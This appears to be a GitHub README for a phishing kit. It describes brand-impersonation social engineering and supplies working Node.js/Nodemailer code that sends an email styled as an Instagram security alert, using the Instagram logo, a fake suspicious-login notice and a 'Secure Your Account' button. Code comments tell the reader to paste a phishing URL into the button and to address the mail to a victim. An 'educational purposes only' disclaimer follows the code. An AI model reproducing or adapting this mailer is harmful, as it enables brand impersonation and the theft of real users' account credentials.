# Advanced-Mastering-Undetectable-Social-Engineering-toolphish
Phishing is a basic Social Engineering attack where a Hacker creates same to same copy HTML made Website login page and then phish credintials login info from the targeted victim.🔗 But, Smart mastering professional Phishing is way more dangerous ⚡ and few steps forward from simple normal phishing. It directly exploits human mind🧠💥(Phsycological)
Nowadays, most people are aware of phishing and stay cautious about it. If an unknown person sends a message, link, image, or any suspicious content, users usually avoid clicking or opening it. However, advanced smart undetectable phishing operates in a far more realistic and sophisticated way ☠️.

In this method, the attacker does not directly message the victim from a random account or ordinary email. Instead, the attacker first disguises themselves as a legitimate, authorized organization or an official company. This may involve using professional-looking business emails, verified-style phone numbers, branded profiles, or carefully designed identities. In other words, the attacker creates a trusted authority image 📛 and builds a convincing brand identity 🪪 to appear authentic and credible.

After establishing this fake but realistic professional presence, the attacker sends emails or messages containing links to the victim. When the victim checks the message, it appears to come from an official authorized company, making the communication look trustworthy and legitimate.

Here, I designed the User Interface (UI) system template almost identical to the real Meta Platform Instagram interface. The upper template design cover that users interact with is what is called the UI (User Interface). Now, if a phishing URL link 🔗 is embedded inside this email, most people would not immediately suspect that it was sent by a hacker or that it is a phishing link. This is because the displayed username, email address, logo image, and even the text body are made to closely resemble the actual emails Instagram sends to users.

What I mainly did was create the link in a realistic and professional way, similar to real-world 🌎 platforms, by turning it into a clickable hyperlink button 🔘 instead of exposing the raw URL directly. In other words, I did not place the link openly inside the email. (Similar to how Google works) I used a hyperlinked button 🔘✅ instead.

When Instagram or Google sends emails such as “Reset Your Password,” “Forgot Password,” or “Secure Your Account,” you will notice that they usually do not display the actual URL openly. Instead, the text itself — like “Reset Your Password” or “Secure Your Account” — becomes clickable. This is known as a hyperlink clicking button. The actual URL remains hidden inside that clickable text. In simple terms, the link is not exposed publicly; it stays embedded behind the clickable words.

This concept is often associated with Social Engineering skills 🧠💥, where the victim must be psychologically tricked 🎯 into trusting the interaction. That is why social engineering has long been considered one of the most dangerous aspects of cyber attacks, and it continues to remain highly effective even today.

Also, none of this was created using special hacking tools or automated phishing software. Everything was built manually using Node.js, JavaScript, and HTML.

𝗥𝗲𝗾𝘂𝗶𝗿𝗲𝗱 𝗜𝗻𝘀𝘁𝗮𝗹𝗹𝗮𝘁𝗶𝗼𝗻 𝗳𝗼𝗿 𝘁𝗵𝗶𝘀 𝗽𝗿𝗼𝗷𝗲𝗰𝘁 :
Node.js + Nodemailer + Python 3.12+
<npm init -y
npm install nodemailer> #if not installed
<pkg install nodejs> #main part of email UI

𝙁𝙤𝙧 𝙄𝙣𝙨𝙩𝙖𝙜𝙧𝙖𝙢 𝙢𝙖𝙞𝙡 📧📥 :-

const nodemailer = require("nodemailer");

// Gmail SMTP setup
const transporter = nodemailer.createTransport({
  service: "gmail",
  auth: {
    user: "YOUR_EMAILADDRESS",
    pass: "PASTE_YOUR_APP_PASSWORD_HERE"
  }
});

// 🎨 Professional Email UI
const htmlContent = `
<!DOCTYPE html>
<html>
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
</head>

<body style="margin:0; padding:0; background:#f4f6f8; font-family:Arial, sans-serif;">

  <table width="100%" cellpadding="0" cellspacing="0" style="padding:40px 0;">
    <tr>
      <td align="center">

        <table width="100%" cellpadding="0" cellspacing="0"
               style="max-width:520px; background:#ffffff; border-radius:14px; overflow:hidden; box-shadow:0 10px 30px rgba(0,0,0,0.08);">

          <!-- HEADER -->
          <tr>
            <td align="center" style="padding:25px; background:#fafafa;">
              <div style="font-size:18px; font-weight:700; color:#262626;">
                Security Alert
              </div>
            </td>
          </tr>

          <!-- LOGO -->
          <tr>
            <td align="center" style="padding-top:30px;">
              <img src="https://upload.wikimedia.org/wikipedia/commons/a/a5/Instagram_icon.png"
                   width="60"
                   height="60"
                   alt="Instagram Logo"
                   style="display:block; border-radius:12px;">
            </td>
          </tr>

          <!-- TITLE -->
          <tr>
            <td align="center" style="padding:15px 30px 10px 30px;">
              <h2 style="margin:0; font-size:20px; color:#111;">
                EMAIL_HEADLINE_REASON #New Login Detected/Password Changed..etc.
              </h2>
            </td>
          </tr>

          <!-- BODY (UPDATED) -->
          <tr>
            <td style="padding:10px 35px; font-size:14px; color:#444; line-height:1.7; text-align:center;">

              EMAIL_TEXT_MESSEGE_HERE #Did you just login to your account nearby Chittagong?<br><br>

              We detected a new sign-in attempt to your account.<br><br>

              Let us know if that was you. If not, we think someone is logged in to your account.<br><br>

              If this was you, no action is needed.<br>
              If not, your account may be at risk.<br><br>

              📱 Device: Realme C53<br>
              📍 Location: Chittagong, Bangladesh 🇧🇩<br>
              🌐 Browser: Chrome

            </td>
          </tr>

          <!-- ALERT -->
          <tr>
            <td align="center" style="padding:15px 30px;">
              <div style="background:#fff5f5; border-left:4px solid #ff4d4d; padding:12px; font-size:13px; color:#b00020; border-radius:6px;">
                EMAIL_SUBHEADLINE_MINDEXPLOITATION_PSHYCOLOGY #⚠️ Suspicious login detected
              </div>
            </td>
          </tr>

          <!-- BUTTON -->
          <tr>
            <td align="center" style="padding:30px;">
              <a href="https://example.com/reset-password" #CLICKING HYPER BUTTON ✅🔘 HERE.PASTE/REPLACE THE PHISHING URL
                 style="background:#1877f2;
                        color:#fff;
                        padding:14px 30px;
                        text-decoration:none;
                        border-radius:8px;
                        font-weight:600;
                        font-size:14px;
                        display:inline-block;">
                Secure Your Account #BUTTON NAME HERE. EDIT BUTTON NAME ON YOUR TYPES OF EMAIL 📨 BASED MESSAGE 
              </a>
            </td>
          </tr>

          <!-- FOOTER -->
          <tr>
            <td align="center" style="padding:20px; font-size:11px; color:#999;">
              This is an automated security message.<br>
              Please do not reply.
            </td>
          </tr>

        </table>

      </td>
    </tr>
  </table>

</body>
</html>
`;

// 📤 Email config
const mailOptions = {
  from: "Security Alert <YOUR_EMAILLADDRESS@Ggmail.com>",
  to: "RECEIVER/VICTIM's_MAIL@gmail.com",
  subject: "YOUR_MAIL_SUBJECT_HERE_BASED_ON_YOUR_MAIL_MESSEGE" #Security Alert - New Login Detected,
  html: htmlContent
};

// 🚀 Send email
transporter.sendMail(mailOptions, (error, info) => {
  if (error) {
    console.log("Error:", error);
  } else {
    console.log("Email sent successfully:", info.response);
  }
});




⚠️ 𝐃𝐢𝐬𝐜𝐥𝐚𝐢𝐦𝐞𝐫 𝐖𝐚𝐫𝐧𝐢𝐧𝐠 ⚠️
This project is built for strictly educational learning purposes only ! It shows how a real world attacker or real advance hacker can phish victim's Credintials info with Advance Mastering Social Engineering tricks and Phsycologically hits 🎯 human mind with brand impersonating 📨 mail 📥
